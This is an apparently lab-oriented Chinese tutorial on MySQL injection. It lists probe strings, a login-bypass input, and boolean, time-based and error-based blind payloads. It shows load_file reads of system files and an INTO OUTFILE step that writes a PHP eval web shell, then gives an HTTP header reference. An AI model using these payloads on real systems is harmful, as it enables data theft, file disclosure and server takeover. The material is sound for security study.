
# 基础知识



此处介绍一些mysql注入的一些基础知识。

## （1）注入的分类---仁者见仁，智者见智。

下面这个是阿德玛表哥的一段话，个人认为分类已经是够全面了。理解不了跳过，当你完全看完整个学习过程后再回头看这段。能完全理解下面的这些每个分类，对每个分类有属于你的认知和了解的时候，你就算是小有成就了，当然仅仅是sql注入上。

## **基于从服务器接收到的响应**

▲基于错误的SQL注入

▲联合查询的类型

▲堆查询注射

▲SQL盲注

•基于布尔SQL盲注

•基于时间的SQL盲注

•基于报错的SQL盲注

## **基于如何处理输入的SQL查询（数据类型）**

•基于字符串

•数字或整数为基础的

## **基于程度和顺序的注入(哪里发生了影响)**

★一阶注射

★二阶注射

一阶注射是指输入的注射语句对WEB直接产生了影响，出现了结果；二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，通过其它的辅助间接的对WEB产生危害，这样的就被称为是二阶注入.-
## **基于注入点的位置上的**

▲通过用户输入的表单域的注射。

▲通过cookie注射。

▲通过服务器变量注射。 （基于头部信息的注射）

（2）系统函数

介绍几个常用函数：-
1\. version()——MySQL版本-
2\. user()——数据库用户名-
3\. database()——数据库名-
4\. @@datadir——数据库路径-
5\. @@version\_compile\_os——操作系统版本

1.  字符串连接函数
    
    函数具体介绍 http://www.cnblogs.com/lcamry/p/5715634.html
    
2.  concat(str1,str2,...)——没有分隔符地连接字符串-
    2\. concat\_ws(separator,str1,str2,...)——含有分隔符地连接字符串-
    3\. group\_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据-
    说着比较抽象，其实也并不需要详细了解，知道这三个函数能一次性查出所有信息就行了。
    
3.  一般用于尝试的语句
    
    Ps:--+可以用#替换，url提交过程中Url编码后的#为%23
    
    or 1=1--+
    
    'or 1=1--+
    
    "or 1=1--+
    
    )or 1=1--+
    
    ')or 1=1--+
    
    ") or 1=1--+
    
    "))or 1=1--+
    
    一般的代码为：
    
    i d \= \_GET\['id'\];
    
    $sql="SELECT \* FROM users WHERE id='$id' LIMIT 0,1";
    
    此处考虑两个点，一个是闭合前面你的 ' 另一个是处理后面的 ' ，一般采用两种思路，闭合后面的引号或者注释掉，注释掉采用--+ 或者 #（%23）
    
4.  union操作符的介绍
    
    UNION 操作符用于合并两个或多个 SELECT 语句的结果集。请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。
    
    **SQL UNION 语法**
    
    SELECT column\_name(s) FROM table\_name1
    
    UNION
    
    SELECT column\_name(s) FROM table\_name2
    
    注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。
    
    **SQL UNION ALL 语法**
    
    SELECT column\_name(s) FROM table\_name1
    
    UNION ALL
    
    SELECT column\_name(s) FROM table\_name2
    
    另外，UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。
    
    （6）sql中的逻辑运算
    
    这里我想说下逻辑运算的问题。
    
    提出一个问题Select \* from users where id=1 and 1=1; 这条语句为什么能够选择出id=1的内容，and 1=1到底起作用了没有？这里就要清楚sql语句执行顺序了。
    
    同时这个问题我们在使用万能密码的时候会用到。
    
    Select \* from admin where username='admin' and password='admin'
    
    我们可以用 'or 1=1# 作为密码输入。原因是为什么？
    
    这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的sql语句为：
    
    Select \* from admin where username='admin' and password=''or 1=1#'
    
    Explain:上面的这个语句执行后，我们在不知道密码的情况下就登录到了admin用户了。
    
    原因是在where子句后，我们可以看到三个条件语句 **username='admin**' and **password=''**or **1=1。**三个条件用and和or进行连接。在sql中，我们and的运算优先级大于or的元算优先级。因此可以看到 第一个条件（用a表示）是真的，第二个条件（用b表示）是假的，a and b = false,第一个条件和第二个条件执行and后是假，再与第三个条件or运算，因为第三个条件1=1是恒成立的，所以结果自然就为真了。因此上述的语句就是恒真了。
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231115468-2134009474.png)![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231116078-838464587.png)![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231116562-1043006312.png)
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231117031-1025968057.png)![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231117531-1140720820.png)
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231117984-1533678061.png)![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231118562-540340952.png)![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231119265-1449217752.png)
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231119968-1625458909.png)![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231120406-578796522.png)
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231121921-2003256622.png)
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231122796-2128238232.png)
    
    ①Select \* from users where id=1 and 1=1;
    
    ②Select \* from users where id=1 && 1=1;
    
    ③Select \* from users where id=1 & 1=1;
    
    上述三者有什么区别？①和②是一样的，表达的意思是 id=1条件和1=1条件进行与运算。
    
    ③的意思是id=1条件与1进行&位操作，id=1被当作true，与1进行 & 运算 结果还是1，再进行=操作，1=1,还是1（ps：&的优先级大于=）
    
    Ps:此处进行的位运算。我们可以将数转换为二进制再进行与、或、非、异或等运算。必要的时候可以利用该方法进行注入结果。例如将某一字符转换为ascii码后，可以分别与1,2,4,8,16,32.。。。进行与运算，可以得到每一位的值，拼接起来就是ascii码值。再从ascii值反推回字符。（运用较少）
    
    （7）注入流程
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231123734-419722822.png)
    
    我们的数据库存储的数据按照上图的形式，一个数据库当中有很多的数据表，数据表当中有很多的列，每一列当中存储着数据。我们注入的过程就是先拿到数据库名，在获取到当前数据库名下的数据表，再获取当前数据表下的列，最后获取数据。
    
    现在做一些mysql的基本操作。启动mysql，然后通过查询检查下数据库:
    
        show databases;
        
    
    [![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231126687-682385349.jpg)](http://image.3001.net/images/20140518/14004115562043.jpg)
    
    这个实验用到的数据库名为security,所以我们选择security来执行命令。
    
        use security;
        
    
    [![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231128609-867066694.jpg)](http://image.3001.net/images/20140518/14004115678162.jpg)
    
    我们可以查看下这个数据库中有哪些表
    
        show tables;
        
    
    [![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231130515-397827153.jpg)](http://image.3001.net/images/20140518/14004115796287.jpg)
    
    现在我们可以看到这里有四张表，然后我们来看下这张表的结构。
    
        desc emails;
        
    
    [![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231132781-684699732.jpg)](http://image.3001.net/images/20140518/14004115934444.jpg)
    
    在继续进行前台攻击时，我们想讨论下系统数据库，即information\_schema。所以我们使用它
    
        use information_schema
        
    
    [![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231134609-1285665006.jpg)](http://image.3001.net/images/20140518/1400411646652.jpg)
    
    让我们来看下表格。
    
        show tables;
        
    
    [![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231136359-575748918.jpg)](http://image.3001.net/images/20140518/14004116693853.jpg)
    
    现在我们先来枚举这张表
    
        desc tables;
        
    
    [![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231138593-1734217810.jpg)](http://image.3001.net/images/20140518/14004116793305.jpg)
    
    现在我们来使用这个查询：
    
        select table_name from information_schema.tables where table_schema = "security";
        
    
    [![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811231141171-1970661891.jpg)](http://image.3001.net/images/20140518/14004116883446.jpg)
    
    使用这个查询，我们可以下载到表名。
    
    Mysql有一个系统数据库information\_schema，存储着所有的数据库的相关信息，一般的，我们利用该表可以进行一次完整的注入。以下为一般的流程。
    
    猜数据库
    
    select schema\_name from information\_schema.schemata
    
    猜某库的数据表
    
    select table\_name from information\_schema.tables where table\_schema='xxxxx'
    
    猜某表的所有列
    
    Select column\_name from information\_schema.columns where table\_name='xxxxx'
    
    获取某列的内容
    
    Select \*\*\* from \*\*\*\*
    
    上述知识参考用例：less1-less4
    



# 盲注讲解




何为盲注？盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。从background-1中，我们可以知道盲注分为三类

•基于布尔SQL盲注

•基于时间的SQL盲注

•基于报错的SQL盲注

Ps：知识点太多了，这里只能简单列出来大致讲解一下。（ps：每当看到前辈的奇淫技巧的payload时，能想象到我内心的喜悦么？我真的想细细的写写这一块，但是不知道该怎么写或者小伙伴需要怎么样来讲这个，可以m我。）

## **1：基于布尔SQL盲注----------构造逻辑判断**

我们可以利用逻辑判断进行

截取字符串相关函数解析http://www.cnblogs.com/lcamry/p/5504374.html（这个还是要看下）

▲left(database(),1)>'s' //left()函数

Explain:database()显示数据库名称，left(a,b)从左侧截取a的前b位

▲ascii(substr((select table\_name information\_schema.tables where tables\_schema=database()limit 0,1),1,1))=101 --+ //substr()函数，ascii()函数

Explain：substr(a,b,c)从b位置开始，截取字符串a的c长度。Ascii()将某个字符转换为ascii值

▲ascii(substr((select database()),1,1))=98

▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))>98%23 //ORD()函数，MID()函数

Explain：mid(a,b,c)从位置b开始，截取a字符串的c位

Ord()函数同ascii()，将字符转为ascii值

▲regexp正则注入

正则注入介绍：[http://www.cnblogs.com/lcamry/articles/5717442.html](http://www.cnblogs.com/lcamry/articles/5717442.html)

用法介绍：select user() regexp '^\[a-z\]';

Explain：正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式。

第二位可以用select user() regexp '^ro'来进行。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811230319906-726420334.png)

当正确的时候显示结果为1，不正确的时候显示结果为0.

示例介绍：

I select \* from users where id=1 and 1=(if((user() regexp '^r'),1,0));

IIselect \* from users where id=1 and 1=(user() regexp'^ri');

通过if语句的条件判断，返回一些条件句，比如if等构造一个判断。根据返回结果是否等于0或者1进行判断。

IIIselect \* from users where id=1 and 1=(select 1 from information\_schema.tables where table\_schema='security' and table\_name regexp '^us\[a-z\]' limit 0,1);

这里利用select构造了一个判断语句。我们只需要更换regexp表达式即可

'^u\[a-z\]' -> '^us\[a-z\]' -> '^use\[a-z\]' -> '^user\[a-z\]' -> FALSE

如何知道匹配结束了？这里大部分根据一般的命名方式（经验）就可以判断。但是如何你在无法判断的情况下，可以用table\_name regexp '^username ′ 来 进 行 判 断 。 是 从 开 头 进 行 匹 配 ， 是从结尾开始判断。更多的语法可以参考mysql使用手册进行了解。

好，这里思考一个问题？![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811230320531-393960428.png)table\_name有好几个，我们只得到了一个user，如何知道其他的？

这里可能会有人认为使用limit 0，1改为limit 1,1。

但是这种做法是错误的，limit作用在前面的select语句中，而不是regexp。那我们该如何选择。其实在regexp中我们是取匹配table\_name中的内容，只要table\_name中有的内容，我们用regexp都能够匹配到。因此上述语句不仅仅可以选择user，还可以匹配其他项。

▲like匹配注入

和上述的正则类似，mysql在匹配的时候我们可以用ike进行匹配。

用法：select user() like 'ro%'

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811230321765-1836175658.png)

## **2：基于报错的SQL盲注------构造payload让信息通过错误提示回显出来**

▲Select 1,count(\*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)\*2))a from information\_schema.columns group by a;

//explain:此处有三个点，一是需要concat计数，二是floor，取得0 or 1，进行数据的重复，三是group by进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时重复造成的错误。也有解释为mysql 的bug 的问题。但是此处需要将rand(0)，rand()需要多试几次才行。

以上语句可以简化成如下的形式。

select count(\*) from information\_schema.tables group by concat(version(),floor(rand(0)\*2))

如果关键的表被禁用了，可以使用这种形式

 select count(\*) from (select 1 union select null union

select !1) group by concat(version(),floor(rand(0)\*2))

如果rand被禁用了可以使用用户变量来报错

 select min(@a:=1) from information\_schema.tables group by concat(password,@a:=(@a+1)%2)

▲select exp(~(select \* FROM(SELECT USER())a)) //double数值类型超出范围

 //Exp()为以e为底的对数函数；版本在5.5.5及其以上

可以参考exp报错文章：[http://www.cnblogs.com/lcamry/articles/5509124.html](http://www.cnblogs.com/lcamry/articles/5509124.html)

▲select !(select \* from (select user())x) -（ps:这是减号） ~0

 //bigint超出范围；~0是对0逐位取反，很大的版本在5.5.5及其以上

可以参考文章bigint溢出文章[http://www.cnblogs.com/lcamry/articles/5509112.html](http://www.cnblogs.com/lcamry/articles/5509112.html)

▲extractvalue(1,concat(0x7e,(select @@version),0x7e)) se//mysql对xml数据进行查询和修改的xpath函数，xpath语法错误

▲updatexml(1,concat(0x7e,(select @@version),0x7e),1) //mysql对xml数据进行查询和修改的xpath函数，xpath语法错误

▲select \* from (select NAME\_CONST(version(),1),NAME\_CONST(version(),1))x;

//mysql重复特性，此处重复了version，所以报错。

## **3:基于时间的SQL盲注----------延时注入**

▲If(ascii(substr(database(),1,1))>115,0,sleep(5))%23 //if判断语句，条件为假，执行sleep

    Ps：遇到以下这种利用sleep()延时注入语句
    			

    select sleep(find_in_set(mid(@@version, 1, 1), '0,1,2,3,4,5,6,7,8,9,.'));
    

    该语句意思是在0-9之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。
    

▲UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM (select database() as current) as tb1;

 //BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep()

函数进行注入。

此处配置一张《白帽子讲安全》图片

  

Mysql

BENCHMARK(100000,MD5(1)) or sleep(5)

Postgresql

PG\_SLEEP(5) OR GENERATE\_SERIES(1,10000)

Ms sql server

WAITFOR DELAY '0:0:5'



# 导入导出介绍



1.  **load\_file()导出文件**
    
    Load\_file(file\_name):读取文件并返回该文件的内容作为一个字符串。
    
    使用条件：
    
    A、必须有权限读取并且文件必须完全可读
    
     and (select count(\*) from mysql.user)>0/\* 如果结果返回正常,说明具有读写权限。
    
     and (select count(\*) from mysql.user)>0/\* 返回错误，应该是管理员给数据库帐户降权
    
    　　B、欲读取文件必须在服务器上
    
    　　C、必须指定文件完整的路径
    
    　　D、欲读取文件必须小于 max\_allowed\_packet
    
    如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限，在windows下，如果NTFS设置得当，是不能读取相关的文件的，当遇到只有administrators才能访问的文件，users就别想load\_file出来。
    
    　　在实际的注入中，我们有两个难点需要解决：
    
    　　 　　绝对物理路径
    
    构造有效的畸形语句 （报错爆出绝对路径）
    
    　　在很多PHP程序中，当提交一个错误的Query，如果display\_errors = on，程序就会暴露WEB目录的绝对路径，只要知道路径，那么对于一个可以注入的PHP程序来说，整个服务器的安全将受到严重的威胁。
    
    常用路径：
    
    [http://www.cnblogs.com/lcamry/p/5729087.html](http://www.cnblogs.com/lcamry/p/5729087.html)
    
        示例：Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)))
        
    
        利用hex()将文件内容导出来，尤其是smb文件时可以使用。
        							
    
        -1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105)) 
        
    
        Explain："char(99,58,47,98,111,111,116,46,105,110,105)"就是"c:/boot.ini"的ASCII代码
        							
    
        -1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69) 
        
    
        Explain："c:/boot.ini"的16进制是"0x633a2f626f6f742e696e69"
        
    
        -1 union select 1,1,1,load_file(c:\\boot.ini) 
        
    
        Explain:路径里的/用 \\代替
        							
2.      文件导入到数据库
        								
    
    LOAD DATA INFILE语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811225756812-1290331945.png)
    
    在注入过程中，我们往往需要一些特殊的文件，比如配置文件，密码文件等。当你具有数据库的权限时，可以将系统文件利用load data infile导入到数据库中。
    
    函数具体介绍：对于参数介绍这里就不过多的赘述了，可以参考mysql的文档。（提醒：参考文档才是最佳的学习资料）
    
    示例：load data infile '/tmp/t0.txt' ignore into table t0 character set gbk fields terminated by '\\t' lines terminated by '\\n'
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811225757453-1502197194.png)
    
    将/tmp/t0.txt导入到t0表中，character set gbk是字符集设置为gbk，fields terminated by是每一项数据之间的分隔符，lines terminated by 是行的结尾符。
    
    当错误代码是2的时候的时候，文件不存在，错误代码为13的时候是没有权限，可以考虑/tmp等文件夹。
    
    TIPS：我们从mysql5.7的文档看到添加了load xml函数，是否依旧能够用来做注入还需要验证。
    
3.  **导入到文件**
    
    SELECT.....INTO OUTFILE 'file\_name'
    
    可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有FILE权限，才能使用此语法。file\_name不能是一个已经存在的文件。
    
    我们一般有两种利用形式：
    
    第一种直接将select内容导入到文件中：
    
    Select version() into outfile "c:\\\\phpnow\\\\htdocs\\\\test.php"
    
    此处将version()替换成一句话，<?php @eval($\_post\["mima"\])?>也即
    
    Select <?php @eval($\_post\["mima"\])?> into outfile "c:\\\\phpnow\\\\htdocs\\\\test.php"
    
    直接连接一句话就可以了，其实在select内容中不仅仅是可以上传一句话的，也可以上传很多的内容。
    
    第二种修改文件结尾：
    
    Select version() Into outfile "c:\\\\phpnow\\\\htdocs\\\\test.php" LINES TERMINATED BY 0x16进制文件
    
        解释：通常是用'\r\n'结尾，此处我们修改为自己想要的任何文件。同时可以用FIELDS TERMINATED BY 
        						
    
    16进制可以为一句话或者其他任何的代码，可自行构造。在sqlmap中os-shell采取的就是这样的方式，具体可参考os-shell分析文章：http://www.cnblogs.com/lcamry/p/5505110.html
    
    TIPS：
    
    （1）可能在文件路径当中要注意转义，这个要看具体的环境
    
     （2）上述我们提到了load\_file(),但是当前台无法导出数据的时候，我们可以利用下面的语句：
    
    select load\_file('c:\\\\wamp\\\\bin\\\\mysql\\\\mysql5.6.17\\\\my.ini')into outfile 'c:\\\\wamp\\\\www\\\\test.php'
    
    可以利用该语句将服务器当中的内容导入到web服务器下的目录，这样就可以得到数据了。上述my.ini当中存在password项（不过默认被注释），当然会有很多的内容可以被导出来，这个要平时积累。
    




# 数据库增删改介绍



在对数据进行处理上，我们经常用到的是增删查改。接下来我们讲解一下mysql 的增删改。查就是我们上述总用到的select，这里就介绍了。

**增加**一行数据。**Insert**

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811224307750-1674236478.png)

简单举例

insert into users values('16','lcamry','lcamry');

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811224308484-95039260.png)

**删除**

 2.删数据:

delete from 表名;

delete from 表名 where id=1;

 删除结构：

删数据库：drop database 数据库名;

删除表：drop table 表名;

删除表中的列:alter table 表名 drop column 列名;

简单举例：

delete from users where id=16

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811224309250-1093278439.png)

**修改**

 修改所有：updata 表名 set 列名='新的值，非数字加单引号' ;

 带条件的修改：updata 表名 set 列名='新的值，非数字加单引号' where id=6;

update users set username='tt' where id=15

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811224309890-845035020.png)


# HTTP头部介绍


在利用抓包工具进行抓包的时候，我们能看到很多的项，下面详细讲解每一项。

HTTP头部详解

1、 Accept：告诉WEB服务器自己接受什么介质类型，\*/\* 表示任何类型，type/\* 表示该类型下的所有子类型，type/sub-type。

2、 Accept-Charset： 浏览器申明自己接收的字符集

Accept-Encoding： 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate）

Accept-Language：：浏览器申明自己接收的语言

语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等。

3、 Accept-Ranges：WEB服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。bytes：表示接受，none：表示不接受。

4、 Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。

5、 Authorization：当客户端接收到来自WEB服务器的 WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给WEB服务器。

6、 Cache-Control：请求：no-cache（不要缓存的实体，要求现在从WEB服务器去取）

max-age：（只接受 Age 值小于 max-age 值，并且没有过期的对象）

max-stale：（可以接受过去的对象，但是过期时间必须小于 max-stale 值）

min-fresh：（接受其新鲜生命期大于其当前 Age 跟 min-fresh 值之和的缓存对象）

响应：public(可以用 Cached 内容回应任何用户)

private（只能用缓存内容回应先前请求该内容的那个用户）

no-cache（可以缓存，但是只有在跟WEB服务器验证了其有效后，才能返回给客户端）

max-age：（本响应包含的对象的过期时间）

ALL: no-store（不允许缓存）

7、 Connection：请求：close（告诉WEB服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）。

keepalive（告诉WEB服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）。

响应：close（连接已经关闭）。

keepalive（连接保持着，在等待本次连接的后续请求）。

Keep-Alive：如果浏览器请求保持连接，则该头部表明希望 WEB 服务器保持连接多长时间（秒）。例如：Keep-Alive：300

8、 Content-Encoding：WEB服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding：gzip

9、Content-Language：WEB 服务器告诉浏览器自己响应的对象的语言。

10、Content-Length： WEB 服务器告诉浏览器自己响应的对象的长度。例如：Content-Length: 26012

11、Content-Range： WEB 服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range: bytes 21010-47021/47022

12、Content-Type： WEB 服务器告诉浏览器自己响应的对象的类型。例如：Content-Type：application/xml

13、 ETag：就是一个对象（比如URL）的标志值，就一个对象而言，比如一个 html 文件，如果被修改了，其 Etag 也会别修改，所以ETag 的作用跟 Last-Modified 的作用差不多，主要供 WEB 服务器判断一个对象是否改变了。比如前一次请求某个 html 文件时，获得了其 ETag，当这次又请求这个文件时，浏览器就会把先前获得的 ETag 值发送给WEB 服务器，然后 WEB 服务器会把这个 ETag 跟该文件的当前 ETag 进行对比，然后就知道这个文件有没有改变了。

14、 Expired：WEB服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB服务器验证了其有效性后，才能用来响应客户请求。是 HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT

15、 Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号。例如：Host：rss.sina.com.cn

16、 If-Match：如果对象的 ETag 没有改变，其实也就意味著对象没有改变，才执行请求的动作。

17、If-None-Match：如果对象的 ETag 改变了，其实也就意味著对象也改变了，才执行请求的动作。

18、 If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码304，告诉浏览器 该对象没有修改。例如：If-Modified-Since：Thu, 10 Apr 2008 09:14:42 GMT

19、If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。

20、 If-Range：浏览器告诉 WEB 服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的 ETag 或者 自己所知道的最后修改时间给 WEB 服务器，让其判断对象是否改变了。总是跟 Range 头部一起使用。

21、 Last-Modified：WEB 服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT

22、 Location：WEB 服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取。例如：Location：http://i0.sinaimg.cn /dy/deco/2008/0528/sinahome\_0803\_ws\_005\_text\_0.gif

23、 Pramga：主要使用 Pramga: no-cache，相当于 Cache-Control： no-cache。例如：Pragma：no-cache

24、 Proxy-Authenticate： 代理服务器响应浏览器，要求其提供代理身份验证信息。Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。

25、 Range：浏览器（比如 Flashget 多线程下载时）告诉 WEB 服务器自己想取对象的哪部分。例如：Range: bytes=1173546-

26、 Referer：浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。例如：Referer：http://www.sina.com/

27、 Server: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61 (Unix)

28、 User-Agent: 浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2、0、0、14

29、 Transfer-Encoding: WEB 服务器表明自己对本响应消息体（不是消息体里面的对象）作了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding: chunked

30、 Vary: WEB服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB服务器在接到第一个请求消息时，其响应消息的头部为：Content- Encoding: gzip; Vary: Content-Encoding那么 Cache 服务器会分析后续请求消息的头部，检查其 Accept-Encoding，是否跟先前响应的 Vary 头部值一致，即是否使用相同的内容编码方法，这样就可以防止 Cache 服务器用自己 Cache 里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding

31、 Via： 列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添 加 Via 头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的Via 头部，并把自己的相关信息加到后面，以此类推，当 OCS 收到最后一个代理服务器的请求时，检查 Via 头部，就知道该请求所经过的路由。例如：Via：1.0 236.D0707195.sina.com.cn:80 (squid/2.6.STABLE13)

推荐使用工具

在抓包和改包的过程中，我们推荐几个相关工具

**live http headers(firefox插件)**

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811224011390-2130978625.png)

**Tamper data(firefox插件)**

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811224012750-1165781396.png)

[查看原网页: www.cnblogs.com](https://www.cnblogs.com/lcamry/p/5763040.html)
# 服务器（两层）架构


首先介绍一下29,30,31这三关的基本情况：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811222207250-1512006912.png)

